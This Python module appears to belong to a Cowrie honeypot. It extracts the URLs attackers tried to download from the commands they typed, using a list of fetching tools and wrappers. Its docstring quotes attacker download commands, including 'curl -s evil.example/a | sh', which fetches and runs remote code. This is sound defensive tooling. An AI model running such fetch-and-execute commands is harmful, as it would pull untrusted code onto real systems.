"""Find the addresses an attacker tried to fetch, from the commands they typed.

When egress is blocked (the default) a download never completes, so Cowrie records no file and no
hash. The address the attacker reached for is then the best indicator the honeypot has, and it
sits in the command text. This reads it out: ``wget http://1.2.3.4/x.sh``, ``curl -s evil.example/a
| sh``, ``tftp -g -r bins.sh 5.6.7.8``, ``busybox ftpget h l r``, even behind ``sh -c``, ``sudo`` or
``cd /tmp &&``.

It only reads text; it never contacts anything. A URL counts only when a fetching tool is the
command (``echo wget http://x`` is not a fetch). Anything built from variables or substitutions
(``http://$HOST/x``) is skipped, because it is not a literal address. Everything is bounded: command
length, addresses per command, and address length.
"""

from __future__ import annotations

import re
from dataclasses import dataclass

FETCH_REVISION = "2"  # bump when extraction changes, so stored sessions are read again

MAX_COMMAND_LENGTH = 20_000
MAX_PER_COMMAND = 20
MAX_URL_LENGTH = 2000

TOOLS = frozenset(
    {
        "wget",
        "curl",
        "tftp",
        "ftpget",
        "fetch",
        "lwp-download",
        "aria2c",
        "axel",
        "git",
    }
)
# Programs that may stand in front of the fetching tool without being the command themselves.
WRAPPERS = frozenset(
    {
        "sudo",
        "nohup",
        "env",
        "time",
        "exec",
        "busybox",
        "toybox",
        "timeout",
        "setsid",
        "nice",
        "ionice",
        "stdbuf",
        "eval",
        "sh",
        "bash",
        "dash",
        "ash",
        "zsh",
        "command",
        "builtin",
        "watch",
        "xargs",
    }
)
# Options that take a value, so the value is never mistaken for an address. Letters that mean
# different things in wget and curl (-s, -c, -l, -i, -p, -d) are left out: missing a value only
# costs a false address, while skipping a real one loses the indicator.
VALUE_OPTIONS = frozenset(
    {
        "-O", "-o", "-P", "-T", "-U", "-e", "-w", "-H", "-A", "-u", "-F", "-X", "-m", "-b", "-K",
        "-r", "--header", "--user-agent", "--output", "--output-document", "--post-data",
        "--post-file", "--directory-prefix", "--timeout", "--tries", "--user", "--password",
        "--data", "--data-binary", "--data-raw", "--form", "--cookie", "--referer",
        "--proxy", "--max-time", "--connect-timeout", "--retry", "--limit-rate", "--upload-file",
    }
)  # fmt: skip

_SEGMENT_BREAK = re.compile(r"\s*(?:;|&&|\|\||\||&|\n|\r|`|\$\(|\()\s*")
_SCHEME_URL = re.compile(r"(?i)\b(?:https?|ftp|tftp)://[^\s'\"`<>|;&(){}\\^]+")
_OCTET = r"(?:25[0-5]|2[0-4]\d|1?\d?\d)"
_IPV4 = rf"{_OCTET}(?:\.{_OCTET}){{3}}"
_DOMAIN = r"(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24}"
_PORT = r"(?::\d{1,5})?"
_BARE_IP = re.compile(rf"(?i)^{_IPV4}{_PORT}(?:/\S*)?$")
_BARE_DOMAIN = re.compile(rf"(?i)^{_DOMAIN}{_PORT}/\S*$")  # a path is required: "x.sh" is a file
_HOST = re.compile(rf"(?i)^(?:{_IPV4}|{_DOMAIN}){_PORT}$")
_TRAILING = ".,:!?)]}'\""
_ENV_ASSIGN = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")


@dataclass(frozen=True)
class Fetch:
    url: str
    tool: str


def _clean(token: str) -> str:
    return token.strip("'\"()").rstrip(";")


def _literal(text: str) -> bool:
    """False for anything that is built at run time rather than written out."""
    return not any(ch in text for ch in "$`{}*\\") and "%s" not in text


def _url(candidate: str) -> str | None:
    candidate = candidate.rstrip(_TRAILING)
    if not candidate or len(candidate) > MAX_URL_LENGTH or not _literal(candidate):
        return None
    if not candidate.isascii() or any(ord(ch) < 0x21 or ord(ch) == 0x7F for ch in candidate):
        return None
    return candidate


def _tool_position(tokens: list[str]) -> int | None:
    """Index of the fetching tool if everything before it is only a wrapper, else None."""
    for index, raw in enumerate(tokens):
        token = _clean(raw)
        name = token.rsplit("/", 1)[-1].lower()
        if name in TOOLS:
            return index
        if (
            name in WRAPPERS
            or token.startswith("-")
            or token.isdigit()
            or _ENV_ASSIGN.match(token)
            or not token
        ):
            continue
        return None  # some other command stands first: this is not a fetch
    return None


def _positionals(args: list[str]) -> list[str]:
    """Arguments that are not options or the values of options."""
    found: list[str] = []
    skip = False
    for raw in args:
        token = _clean(raw)
        if skip:
            skip = False
            continue
        if token.startswith("-"):
            skip = token in VALUE_OPTIONS
            continue
        if token:
            found.append(token)
    return found


def _tftp(args: list[str]) -> list[str]:
    tokens = [_clean(t) for t in args]
    remote = ""
    files: set[str] = set()  # file names, which can look like host names ("bins.sh")
    for index, word in enumerate(tokens[:-1]):
        if word in ("-r", "-l", "get", "put"):
            files.add(tokens[index + 1])
        if word == "-r" or (word == "get" and not remote):
            remote = tokens[index + 1]
    hosts = [t for t in _positionals(args) if _HOST.match(t) and t not in files]
    hosts.sort(key=lambda t: 0 if re.fullmatch(_IPV4 + _PORT, t) else 1)  # an address beats a name
    if not hosts or not _literal(remote):
        return []
    return [f"tftp://{hosts[0]}/{remote.lstrip('/')}"]


def _ftpget(args: list[str]) -> list[str]:
    positional = _positionals(args)
    for index, token in enumerate(positional):
        if _HOST.match(token):  # skips the value of -p, which this table cannot know about
            after = positional[index + 1 :]
            remote = after[-1] if after else ""
            return [f"ftp://{token}/{remote.lstrip('/')}"] if _literal(remote) else []
    return []


def _from_segment(segment: str) -> list[Fetch]:
    tokens = segment.split()
    position = _tool_position(tokens)
    if position is None:
        return []
    tool = _clean(tokens[position]).rsplit("/", 1)[-1].lower()
    args = tokens[position + 1 :]
    if tool == "git" and (not args or _clean(args[0]) != "clone"):
        return []
    found: list[str] = []
    if tool == "tftp":
        found.extend(_tftp(args))
    elif tool == "ftpget":
        found.extend(_ftpget(args))
    rest = " ".join(args)
    found.extend(match.group() for match in _SCHEME_URL.finditer(rest))
    if tool in ("wget", "curl", "aria2c", "axel", "lwp-download", "fetch"):
        for token in _positionals(args):
            if "://" not in token and (_BARE_IP.match(token) or _BARE_DOMAIN.match(token)):
                found.append(f"http://{token}")
    cleaned = (_url(candidate) for candidate in found)
    return [Fetch(url=url, tool=tool) for url in cleaned if url]


def extract(command: str) -> list[Fetch]:
    """Every address the command tries to fetch, once each, in the order it appears."""
    if not command or len(command) > MAX_COMMAND_LENGTH:
        return []
    seen: set[str] = set()
    result: list[Fetch] = []
    for segment in _SEGMENT_BREAK.split(command):
        for item in _from_segment(segment):
            if item.url not in seen:
                seen.add(item.url)
                result.append(item)
                if len(result) >= MAX_PER_COMMAND:
                    return result
    return result
